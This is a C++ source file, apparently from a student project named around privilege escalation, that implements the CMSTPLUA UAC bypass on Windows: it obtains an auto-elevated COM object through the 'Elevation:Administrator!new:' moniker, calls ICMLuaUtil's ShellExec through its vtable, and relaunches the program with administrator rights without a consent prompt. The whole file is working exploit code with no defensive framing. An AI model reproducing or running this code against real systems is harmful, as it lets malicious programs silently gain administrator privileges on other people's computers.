/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   cmstplua.cpp                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: zcadinot <zcadinot@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/08/24 02:37:40 by zcadinot          #+#    #+#             */
/*   Updated: 2026/08/24 03:21:20 by zcadinot         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "privesc.hpp"
#include <objbase.h>

  static const CLSID g_clsid_cmstplua =
      {0x3E5FC7F9, 0x9A51, 0x4367,
       {0x90, 0x63, 0xA1, 0x20, 0x24, 0x4F, 0xBE, 0xC7}};

  static const IID g_iid_icmluautil =
      {0x6EDD6D74, 0xC007, 0x4E75,
       {0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C}};

typedef HRESULT (__stdcall *ShellExec_t)(
      void    *this_ptr,
      wchar_t *file,
      wchar_t *params,
      wchar_t *dir,
      ULONG    flags,
      ULONG    show
	);

bool elevate_cmstplua()
{
	void    *util = NULL;
	void    **vtable;
	ShellExec_t shell_exec;
	wchar_t wpath[MAX_PATH];
	char    *path;
	wchar_t moniker[128];
	BIND_OPTS3 opts;
	HRESULT hr;

	hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	if (FAILED(hr))
	{
		printf("CoInitializeEx failed: 0x%08lX\n", (unsigned long)hr);
		return (false);
	}

	swprintf(moniker, 128,
		L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}");
	memset(&opts, 0, sizeof(opts));
	opts.cbStruct = sizeof(opts);
	opts.dwClassContext = CLSCTX_LOCAL_SERVER;

	hr = CoGetObject(moniker, &opts, g_iid_icmluautil, &util);
	if (FAILED(hr))
	{
		printf("CoGetObject failed: 0x%08lX\n", (unsigned long)hr);
		fflush(stdout);
		CoUninitialize();
		return (false);
	}
	vtable = *(void ***)util;
	shell_exec = (ShellExec_t)vtable[9];

	path = get_myh_path();
	MultiByteToWideChar(CP_ACP, 0, path, -1, wpath, MAX_PATH);

	hr = shell_exec(util, wpath, NULL, NULL, 0, SW_SHOW);

	((IUnknown *)util)->Release();
	CoUninitialize();
	if (FAILED(hr))
	{
		printf("ICMLuaUtil::ShellExec failed: 0x%08lX\n",
			(unsigned long)hr);
		return (false);
	}

	ExitProcess(0);
	return (true);
}
